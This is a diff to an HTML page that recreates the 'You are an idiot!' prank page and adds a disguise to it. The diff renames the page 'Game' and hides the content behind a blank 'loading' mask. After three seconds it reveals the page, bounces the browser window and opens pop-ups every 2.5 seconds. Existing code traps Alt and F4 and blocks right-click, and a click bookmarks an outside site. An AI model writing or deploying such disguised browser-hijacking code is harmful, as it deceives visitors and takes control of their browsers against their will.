@@ -1,17 +1,20 @@
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
 <html>
 <head>
-    <title>You are an idiot!</title>
+    <title>Game</title>
     <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
 </head>
 <body bgcolor="#ffffff" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" onclick="addBookmark()">
-    
-    <!-- Forced 4:3 aspect ratio by resizing the image itself -->
-    <div align="center">
-        <img src="flashl.gif" alt="You are an idiot!" width="640" height="480">
+
+    <!-- The loading mask (this is what covers the screen) -->
+    <div id="loading_mask" style="position:absolute; top:0; left:0; width:100%; height:100%; background-color:#ffffff; z-index:9999;"></div>
+
+    <!-- The actual content (hidden behind the mask) -->
+    <div align="center" style="visibility:hidden;">
+        <img id="idiot_gif" src="flashl.gif" alt="You are an idiot!" width="640" height="480">
     </div>
 
-    <bgsound src="idiotl.mp3" loop="infinite">
+    <bgsound id="bg_audio" src="idiotl.mp3" loop="infinite">
 
     <script language="Javascript">
         // --- IE4/5 safe named functions ---
@@ -24,6 +27,26 @@
             if (navigator.appName == "Microsoft Internet Explorer" && parseInt(navigator.appVersion) >= 4) {
                 window.external.AddFavorite("https://yaai.adngsnews.site/legacy.html", "You are an idiot!");
             }
+        }
+
+        // --- Load & Reveal the Chaos ---
+        function revealChaos() {
+            // 1. Show the GIF
+            document.getElementById("idiot_gif").style.visibility = "visible";
+
+            // 2. Remove the loading mask
+            document.getElementById("loading_mask").style.display = "none";
+
+            // 3. Change the title to the truth
+            document.title = "You are an idiot!";
+
+            // 4. Bounce the window
+            flagRun = 1;
+            playBall();
+
+            // 5. Spawn the pop-ups
+            procreate();
+            setInterval("procreate()", 2500);
         }
 
         var flagRun = 1;
@@ -55,13 +78,6 @@
             }
         }
 
-        function startChaos() {
-            document.title = "You are an idiot!";
-            playBall();
-            procreate();
-            setInterval("procreate()", 2500);
-        }
-
         // Named function for keyboard traps
         function keyTrap() {
             if (event.keyCode == 18 || event.keyCode == 115) {
@@ -80,6 +96,9 @@
 
         document.onkeydown = keyTrap;
         document.oncontextmenu = blockRightClick;
+
+        // --- Wait for GIF to load before revealing chaos ---
+        setTimeout("revealChaos()", 3000); // 3 seconds of "innocent" loading
     </script>
 </body>
 </html>
